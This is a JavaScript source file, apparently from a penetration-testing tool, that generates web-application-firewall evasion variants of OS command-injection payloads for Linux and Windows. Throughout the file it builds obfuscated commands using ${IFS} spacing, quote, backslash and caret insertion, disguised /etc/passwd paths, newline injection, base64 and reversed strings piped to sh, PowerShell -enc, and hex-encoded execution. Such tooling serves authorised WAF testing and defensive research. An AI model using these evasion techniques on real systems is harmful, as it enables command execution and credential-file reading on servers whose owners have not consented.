/**
 * OS Command Injection WAF Bypass Engine
 * Generates multiple evasion variants for command injection payloads.
 * Supports: Linux, Windows
 */

import { urlEncode } from '../utils/encoding'
import { parseCommand, pickOne } from '../utils/helpers'

/* ── Linux Space Bypass ───────────────────────────── */
function applySpaceBypassLinux(payload) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)

  if (args) {
    // ${IFS} replacement
    variants.push(`${prefix}${command}\${IFS}${args.replace(/ /g, '${IFS}')}`)
    // {cmd,arg} brace expansion
    const allParts = [command, ...args.split(/\s+/)].filter(Boolean)
    variants.push(`${prefix}{${allParts.join(',')}}`)
    // $IFS$9 variant
    variants.push(`${prefix}${command}\$IFS\$9${args.replace(/ /g, '$IFS$9')}`)
    // Tab (%09)
    variants.push(`${prefix}${command}%09${args.replace(/ /g, '%09')}`)
    // < redirect (for single file arg)
    if (args.split(/\s+/).length === 1) {
      variants.push(`${prefix}${command}<${args}`)
    }
  } else {
    variants.push(payload)
  }

  return variants
}

/* ── Windows Space Bypass ─────────────────────────── */
function applySpaceBypassWindows(payload) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)

  if (args) {
    // %09 (tab)
    variants.push(`${prefix}${command}%09${args.replace(/ /g, '%09')}`)
    // , as delimiter (cmd specific)
    variants.push(`${prefix}${command},${args.replace(/ /g, ',')}`)
    // ; as delimiter
    variants.push(`${prefix}${command};${args.replace(/ /g, ';')}`)
  } else {
    variants.push(payload)
  }

  return variants
}

/* ── Keyword Bypass (Linux) ───────────────────────── */
function applyKeywordBypassLinux(payload) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)

  // Single-quote insertion: c'a't
  const quoted = command.split('').map((c, i) => {
    if (i > 0 && i < command.length - 1 && Math.random() > 0.5) return `'${c}'`
    return c
  }).join('')
  variants.push(`${prefix}${quoted} ${args}`.trim())

  // Double-quote insertion: c"a"t
  const dquoted = command.split('').map((c, i) => {
    if (i > 0 && i < command.length - 1 && Math.random() > 0.5) return `"${c}"`
    return c
  }).join('')
  variants.push(`${prefix}${dquoted} ${args}`.trim())

  // Backslash insertion: c\a\t
  const bslash = command.split('').map((c, i) => {
    if (i > 0 && i < command.length - 1 && Math.random() > 0.4) return `\\${c}`
    return c
  }).join('')
  variants.push(`${prefix}${bslash} ${args}`.trim())

  // $@ insertion: c$@at
  const dollarAt = command.replace(/(.)(.)/, '$1$@$2')
  variants.push(`${prefix}${dollarAt} ${args}`.trim())

  // Empty variable: ca${z}t
  const emptyVar = command.replace(/(.)(.)/, '$1${z}$2')
  variants.push(`${prefix}${emptyVar} ${args}`.trim())

  // Also obfuscate file paths in args
  if (args.includes('/etc/passwd')) {
    const obfArgs = [
      args.replace('/etc/passwd', "/e'tc/pa'ss'wd"),
      args.replace('/etc/passwd', '/e"t"c/pas"s"wd'),
      args.replace('/etc/passwd', '/e\\tc/pas\\swd'),
      args.replace('/etc/passwd', '/etc/pass${z}wd'),
    ]
    obfArgs.forEach(a => {
      variants.push(`${prefix}${command} ${a}`.trim())
    })
  }

  return variants
}

/* ── Keyword Bypass (Windows) ─────────────────────── */
function applyKeywordBypassWindows(payload) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)

  // ^ insertion: w^h^o^a^m^i
  const caret = command.split('').map((c, i) => {
    if (i > 0 && Math.random() > 0.4) return `^${c}`
    return c
  }).join('')
  variants.push(`${prefix}${caret} ${args}`.trim())

  // %COMSPEC% /c
  variants.push(`${prefix}%COMSPEC% /c ${command} ${args}`.trim())

  // set + call trick
  const varName = 'x' + Math.floor(Math.random() * 99)
  variants.push(`set ${varName}=${command}&& call %${varName}% ${args}`.trim())

  // cmd /V:ON with delayed expansion
  variants.push(`cmd /V:ON /C "set ${varName}=${command}&& !${varName}! ${args}"`.trim())

  return variants
}

/* ── Newline Injection ────────────────────────────── */
function applyNewlineBypass(payload) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)
  const cmd = `${command}${args ? ' ' + args : ''}`

  // %0a (URL encoded newline)
  variants.push(`${prefix}%0a${cmd}`)
  // %0d%0a (CRLF)
  variants.push(`${prefix}%0d%0a${cmd}`)
  // $'\n' (bash ANSI-C quoting)
  variants.push(`${prefix}$'\\n'${cmd}`)

  return variants
}

/* ── Variable Expansion Tricks ────────────────────── */
function applyVariableExpansion(payload, target) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)

  if (target === 'linux') {
    // Subshell execution
    variants.push(`${prefix}$(${command}${args ? ' ' + args : ''})`)
    // Backtick execution
    variants.push(`${prefix}\`${command}${args ? ' ' + args : ''}\``)
    // Base64 encoded execution
    const b64 = btoa(`${command}${args ? ' ' + args : ''}`)
    variants.push(`${prefix}$(echo ${b64}|base64 -d|sh)`)
    // Rev trick
    const reversed = `${command}${args ? ' ' + args : ''}`.split('').reverse().join('')
    variants.push(`${prefix}$(echo '${reversed}'|rev|sh)`)
  } else {
    // PowerShell encoded command
    variants.push(`${prefix}powershell -enc ${btoa(`${command} ${args}`)}`)
    // FOR loop obfuscation
    variants.push(`${prefix}FOR /F "tokens=*" %i IN ('${command} ${args}') DO @echo %i`)
  }

  return variants
}

/* ── Hex Encoded Commands ─────────────────────────── */
function applyHexCmd(payload, target) {
  const variants = []
  const { prefix, command, args } = parseCommand(payload)

  if (target === 'linux') {
    // printf hex
    const hex = Array.from(command).map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('')
    variants.push(`${prefix}$(printf '${hex}')${args ? ' ' + args : ''}`)

    // xxd approach
    const hexStr = Array.from(command).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('')
    variants.push(`${prefix}$(echo ${hexStr}|xxd -r -p)${args ? ' ' + args : ''}`)

    // Also hex-encode arguments if present
    if (args) {
      const fullHex = Array.from(`${command} ${args}`).map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('')
      variants.push(`${prefix}$(printf '${fullHex}'|sh)`)
    }
  }

  return variants
}

/* ── Main Engine ─────────────────────────────────── */
export function generateCmdiVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = []
  allVariants.push({ payload, label: 'Original', layers: [] })

  if (layers.includes('space-bypass')) {
    const fn = target === 'windows' ? applySpaceBypassWindows : applySpaceBypassLinux
    fn(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Space Bypass', layers: ['space-bypass'] })
    })
  }

  if (layers.includes('keyword-bypass')) {
    const fn = target === 'windows' ? applyKeywordBypassWindows : applyKeywordBypassLinux
    fn(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Keyword Bypass', layers: ['keyword-bypass'] })
    })
  }

  if (layers.includes('newline-bypass')) {
    applyNewlineBypass(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Newline Injection', layers: ['newline-bypass'] })
    })
  }

  if (layers.includes('variable-expansion')) {
    applyVariableExpansion(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Variable Expansion', layers: ['variable-expansion'] })
    })
  }

  if (layers.includes('hex-cmd')) {
    applyHexCmd(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Hex Commands', layers: ['hex-cmd'] })
    })
  }

  // Combos
  if (layers.length >= 2) {
    if (layers.includes('space-bypass') && layers.includes('keyword-bypass') && target === 'linux') {
      const { prefix, command, args } = parseCommand(payload)
      if (args) {
        const obfCmd = command.replace(/(.)(.)/, "$1''$2")
        const combo = `${prefix}${obfCmd}\${IFS}${args.replace(/ /g, '${IFS}')}`
        allVariants.push({ payload: combo, label: 'Space + Keyword', layers: ['space-bypass', 'keyword-bypass'] })
      }
    }
  }

  // Deduplicate
  const seen = new Set()
  const unique = allVariants.filter(v => {
    if (seen.has(v.payload)) return false
    seen.add(v.payload)
    return true
  })

  return unique.slice(0, 12)
}
